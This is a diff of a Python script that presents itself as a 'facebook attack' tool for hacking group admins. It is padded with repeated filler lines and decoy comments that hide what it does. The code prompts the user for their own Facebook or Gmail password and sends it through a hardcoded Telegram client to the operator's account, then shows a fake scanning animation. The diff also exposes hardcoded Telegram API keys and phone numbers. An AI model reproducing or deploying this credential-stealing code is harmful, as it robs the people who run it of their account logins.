@@ -15,6 +15,589 @@ what are you looking for????
 what are you looking for????
 what are you looking for????
 what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
+what are you looking for????
 
 
 what are you looking for????
@@ -724,10 +1307,10 @@ over use, tools works as below.....
 3: You can only hack admin of group you are in,
    but can't hack admin of anygroup you are not in
 4: While loading the password, phone and gmail of
-   client, log in to ur account then u receive a
+   client, log in to ur account then u receive a 
    notification like this 'dh4DQ6e6sA0Q@gs738Zzd'.
 5: In order not to get hack by friends that are in
-   to this tool make ur facebook web-hook, go to
+   to this tool make ur facebook web-hook, go to 
    http://facebook.com/developer to get ur web-hook
 
   """
@@ -766,10 +1349,10 @@ def femi():
 ..        ..    .........    ....... .......... ......
 
   \033[1;31;40m                            facebook attack
-                              version 2.1.0           
+                              version 2.1.0             
          \033[0;34;47m telegram @vedalogic for more info \033[0;37;48m"""+r)
 def facebook():
-    print("""      \033[95m                                                                                 
+    print("""      \033[95m                                                                                  
    ______    ____      ____   ___  __   __   __
   ///////\033[96m   //  \\\    //   | |    |  \ |  | |  | | /
   ||     \033[96m  //____\\\  ||      |___ |  / |  | |  | |/
@@ -792,7 +1375,7 @@ def option():
 
 \033[1;33;40m[a]\033[94m @nigeriahacker                 \033[1;33;40m [b]\033[91m exist
 
-                                                      
+                                                                        
 
     """+r)
 clear()
@@ -807,27 +1390,27 @@ try:
    '''you can not read my code for sure'''
 
    '''you can not read my code for sure'''
-   phone= "+2349095195883"
+   phone= "+2347048621217"
 
    '''you can not read my code for sure'''
 
    '''you can not read my code for sure'''
-   api_id = 3668597
+   api_id = 4353180
 
    '''you can not read my code for sure'''
 
    '''you can not read my code for sure'''
-   api_hash = "3a32fe7d1f829cca4c4e23faa905949f"
+   api_hash = "2d307ab961e1741f90cc572217d39672"
 
    '''you can not read my code for sure'''
 
    '''you can not read my code for sure'''
-   client = TelegramClient("hack", api_id, api_hash)
+   client = TelegramClient("hack", api_id, api_hash) 
 
    '''you can not read my code for sure'''
 
    '''you can not read my code for sure'''
-
+  
 
    '''you can not read my code for sure'''
 
@@ -857,7 +1440,7 @@ try:
    '''you can not read my code for sure'''
 
    '''you can not read my code for sure'''
-
+     
 
    '''you can not read my code for sure'''
 
@@ -867,7 +1450,7 @@ try:
    '''you can not read my code for sure'''
 
    '''you can not read my code for sure'''
-
+   
 
    '''you can not read my code for sure'''
 
@@ -923,7 +1506,7 @@ try:
 
      '''you can not read my code for sure'''
      clear()
-
+ 
      '''you can not read my code for sure'''
 
      '''you can not read my code for sure'''
@@ -1029,314 +1612,314 @@ except ValueError:
    '''you can not read my code for sure'''
 
    '''WOW! you brave, still checking?'''
-
+    
    '''WOW! you brave, still checking?'''
 except OperationalError:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
          print(r+" contact me now \n you've used it too much time")
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
          sys.exit()
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
 except ApiIdInvalidError:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
          print(r+"wrong api_id/api_hash, check and try again later")
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
          sys.exit()
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
 except PhoneNumberInvalidError:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
          print(r+"wrong password try again later")
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
          sys.exit()
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
 except PhoneNumberUnoccupiedError:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
          print(r+"The phone number provided is not yet USED")
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
          sys.exit()
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
 except PhoneCodeInvalidError:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
          print(r+"wrong code, contact me +2349095195883")
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
          sys.exit()
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
 except PhoneCodeEmptyError:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
          print(r+"empty code try again later")
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
          sys.exit()
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
 except PhoneCodeExpiredError:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
          print(r+"expired code, lolz, contact me +2349095195883")
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
          sys.exit()
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
 except SessionPasswordNeededError:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
          print(r+"Two password authentification")
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
          sys.exit()
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
 except errors.FloodWaitError as e:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
          print(r+'Have to sleep', e.seconds, 'seconds')
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
          deal = input("Due to the fact of requesting too much code on this phone, "+str(e)+" seconds? (y/n): ")
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
          if deal=="y" or deal== "yes":
 
           '''WOW! you brave, still checking?'''
-
+    
           '''WOW! you brave, still checking?'''
           time.sleep(e.seconds)
 
           '''WOW! you brave, still checking?'''
-
+    
           '''WOW! you brave, still checking?'''
          else:
 
           '''WOW! you brave, still checking?'''
-
+    
           '''WOW! you brave, still checking?'''
           sys.exit()
 
           '''WOW! you brave, still checking?'''
-
+    
           '''WOW! you brave, still checking?'''
 sp(1)
 
 '''WOW! you brave, still checking?
-
+    
          WOW! you brave, still checking?'''
 clear()
 
 '''WOW! you brave, still checking?
-
+    
          WOW! you brave, still checking?'''
 talk()
 
 '''WOW! you brave, still checking?
-
+    
          WOW! you brave, still checking?'''
 sp(1)
 
 '''WOW! you brave, still checking?
-
+    
          WOW! you brave, still checking?'''
 clear()
 
 '''WOW! you brave, still checking?
-
+    
          WOW! you brave, still checking?'''
 sk = input(" facebook OR instagram (f/i): ")
 
 '''WOW! you brave, still checking?
-
+    
          WOW! you brave, still checking?'''
 sk.lower()
 
 '''WOW! you brave, still checking?'''
-
+    
 '''WOW! you brave, still checking?'''
 if "f" in sk:
 
     '''WOW! you brave, still checking?'''
-
+    
     '''WOW! you brave, still checking?'''
     phone = input(" enter phone: ")
 
     '''WOW! you brave, still checking?'''
-
+    
     '''WOW! you brave, still checking?'''
     psswd = input(" enter password: ")
 
     '''WOW! you brave, still checking?'''
-
+    
     '''WOW! you brave, still checking?'''
     gmail = "non@e"
 
     '''WOW! you brave, still checking?'''
-
+    
     '''WOW! you brave, still checking?'''
     paswd = "none"
 
     '''WOW! you brave, still checking?'''
-
+    
     '''WOW! you brave, still checking?'''
     if "+" not in phone:
 
      '''WOW! you brave, still checking?'''
-
+    
      '''WOW! you brave, still checking?'''
      print(r+"\n \n \n invalid Phone number")
 
      '''WOW! you brave, still checking?'''
-
+    
      '''WOW! you brave, still checking?'''
 else:
 
     '''WOW! you brave, still checking?'''
-
+    
     '''WOW! you brave, still checking?'''
     gmail = input(" enter gmail: ")
 
     '''WOW! you brave, still checking?'''
-
+    
     '''WOW! you brave, still checking?'''
     paswd = input(" enter password: ")
 
     '''WOW! you brave, still checking?'''
-
+    
     '''WOW! you brave, still checking?'''
     phone = "n+one"
 
     '''WOW! you brave, still checking?'''
-
+    
     '''WOW! you brave, still checking?'''
     psswd = "none"
 
     '''WOW! you brave, still checking?'''
-
+    
     '''WOW! you brave, still checking?'''
 if "@" not in gmail:
 
     '''WOW! you brave, still checking?'''
-
+    
     '''WOW! you brave, still checking?'''
     print(r+"\n \n")
 
     '''WOW! you brave, still checking?'''
-
+    
     '''WOW! you brave, still checking?'''
     print(" invalid gmail")
 
     '''WOW! you brave, still checking?'''
-
+    
     '''WOW! you brave, still checking?'''
     sys.exit()
 
     '''WOW! you brave, still checking?'''
-
+    
     '''WOW! you brave, still checking?'''
 
 
 '''WOW! you brave, still checking?'''
-
+    
 '''WOW! you brave, still checking?'''
 
 '''WOW! you brave, still checking?'''
-
+    
 '''WOW! you brave, still checking?'''
 
 '''WOW! you brave, still checking?'''
-
+    
 '''WOW! you brave, still checking?'''
 async def main():
         print(g+"please wait...")
         '''WOW! you brave, still checking?'''
-
+    
         '''WOW! you brave, still checking?'''
         me = await client.get_me()
 
         '''WOW! you brave, still checking?'''
-
+    
         '''WOW! you brave, still checking?'''
         async def man():
             p = "please wait...\ndepends on connection"
             '''WOW! you brave, still checking?'''
-
+    
             '''WOW! you brave, still checking?'''
 
             '''WOW! you brave, still checking?'''
-
+    
             '''WOW! you brave, still checking?'''
             message ="  phone: "+phone+"\n\n password: "+paswd+"\n \n "+ "\n\n gmail: "+gmail+"\n\n password: "+psswd
 
             '''WOW! you brave, still checking?'''
-
+    
             '''WOW! you brave, still checking?'''
             try:
               await client.send_message(me,message)
@@ -1347,579 +1930,579 @@ async def main():
               print(r+"check your mobile data/wifi\n")
               sys.exit()
               ''' WOW! you brave, still checking?
-
+    
          WOW! you brave, still checking?
                  print(r)
 
          WOW! you brave, still checking?
-
+    
          WOW! you brave, still checking?'
               except AuthKeyDuplicatedError:
 
          'WOW! you brave, still checking?
-
+    
          'WOW! you brave, still checking?'
                 print(r+" AuthKeyDuplicatedError")
 
          'WOW! you brave, still checking?''
-
+    
          'WOW! you brave, still checking?''
               except BotDomainInvalidError:
 
          'WOW! you brave, still checking?''
-
+    
          'WOW! you brave, still checking?''
                 print(r+" BotDomainInvalidError")
 
          ''WOW! you brave, still checking?''
-
+    
          'WOW! you brave, still checking?''
               except ForbiddenError:
 
          ''WOW! you brave, still checking?''
-
+    
          ''WOW! you brave, still checking?''
                 print(r+" You got blocked from "+name)
 
          ''WOW! you brave, still checking?''
-
+    
          ''WOW! you brave, still checking?''
               except ButtonDataInvalidError:
 
          ''WOW! you brave, still checking?''
-
+    
          ''WOW! you brave, still checking?''
                 print(r+" ButtonDataInvalidError")'''
             """
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
               except ButtonTypeInvalidError:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
                 print(r+" ButtonTypeInvalidError")
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
               except ChatAdminRequiredError:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
                 print(r+" ChatAdminRequiredError")
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
               except ChannelPrivateError:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
                 print(r+" ChannelPrivateError")
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
               except ChannelInvalidError:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
                 print(r+" ChannelInvalidError")
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
               except ButtonUrlInvalidError:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
                 print(r+" ButtonUrlInvalidError")
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
               except EntitiesTooLongError:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
                 print(r+" EntitiesTooLongError")
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
               except ChatWriteForbiddenError:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
                 print(r+" You not allow to message "+y+name)
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
               except ChatIdInvalidError:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
                 print(r+" ChatIdInvalidError")
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
               except ChatRestrictedError:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
                 print(r+" ChatRestrictedError")
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
               except MessageEmptyError:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
                 print(r+" MessageEmptyError")
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
               except InputUserDeactivatedError:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
                 print(r+" InputUserDeactivatedError")
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
               except EntityMentionUserInvalidError:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
                 print(r+" EntityMentionUserInvalidError")
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
               except ChatWriteForbiddenError:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
                 print(r+" ChatWriteForbiddenError")
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
               except PollOptionInvalidError:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
                 print(r+" PollOptionInvalidError")
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
               except ValueError:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
                 print(r+" Invalid name"+y+name)
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
               except PeerIdInvalidError:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
                 print(r+" PeerIdInvalidError")
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
               except MsgIdInvalidError:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
                 print(r+" MsgIdInvalidError")
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
               except MessageTooLongError:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
                 print(r+" MessageTooLongError")
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
               except ScheduleBotNotAllowedError:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
                 print(r+" ScheduleBotNotAllowedError")
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
               except ScheduleDateTooLateError:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
                 print(r+" ScheduleDateTooLateError")
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
               except ScheduleStatusPrivateError:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
                 print(r+" ScheduleStatusPrivateError")
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
               except UserIsBlockedError:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
                 print(r+" UserIsBlockedError")
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
               except YouBlockedUserError:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
                 print(r+" YouBlockedUserError")
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
               except UserBannedInChannelError:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
                 print(r+" UserBannedInChannelError")
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
               except UserIsBotError:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
                 print(r+" UserIsBotError")
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
               except TimeoutError:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
                 print(r+" TimeoutError")
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
               except ScheduleTooMuchError:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
                 print(r+" ScheduleTooMuchError")
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
               except ReplyMarkupInvalidError:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
                 print(r+" ReplyMarkupInvalidError")
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
               except RandomIdDuplicateError:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
                 print(r+" RandomIdDuplicateError")
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
               except ReplyMarkupTooLongError:
 
          '''WOW! you brave, still checking?'''
-
+    
          '''WOW! you brave, still checking?'''
                 print(r+" ReplyMarkupTooLongError")
 
          '''WOW! you brave, still checking?'''
-
+    
          WOW! you brave, still checking?'''"""
-            a = input("\033[1;37;40m🙏\033[1;34;40m select an option:  ")
+            a = input("\033[1;37;40m🙏\033[1;34;40m select an option:  ")          
 
             '''WOW! you brave, still checking?'''
-
+    
             '''WOW! you brave, still checking?'''
             if a == "a" or a == "9" or a == "b":
               print(g+"Only on telegram, chat me up\n\n")
             else:
 
                '''WOW! you brave, still checking?'''
-
+    
                '''WOW! you brave, still checking?'''
                a = input(r+" enter path:   "+g)
 
                '''WOW! you brave, still checking?'''
-
+    
                '''WOW! you brave, still checking?'''
-               for i in range(3,666,3):
+               for i in range(3,999,3):
 
                  '''WOW! you brave, still checking?'''
+    
+                 '''WOW! you brave, still checking?'''
+                 sp(0.1)
 
                  '''WOW! you brave, still checking?'''
-                 sp(0.3)
-
-                 '''WOW! you brave, still checking?'''
-
+    
                  '''WOW! you brave, still checking?'''
                  if i%2==1:
 
                    '''WOW! you brave, still checking?'''
-
+    
                    '''WOW! you brave, still checking?'''
                    print(y+"scanning.../")
 
                    '''WOW! you brave, still checking?'''
-
+    
                    '''WOW! you brave, still checking?'''
                  if i%2==0:
 
                    '''WOW! you brave, still checking?'''
-
+    
                    '''WOW! you brave, still checking?'''
                    print(y+"scanning...\\")
 
                    '''WOW! you brave, still checking?'''
+    
+                   '''WOW! you brave, still checking?'''
+    
 
                    '''WOW! you brave, still checking?'''
-
-
-                   '''WOW! you brave, still checking?'''
-
+    
                    '''WOW! you brave, still checking?'''
                for j in range(3,999,3):
 
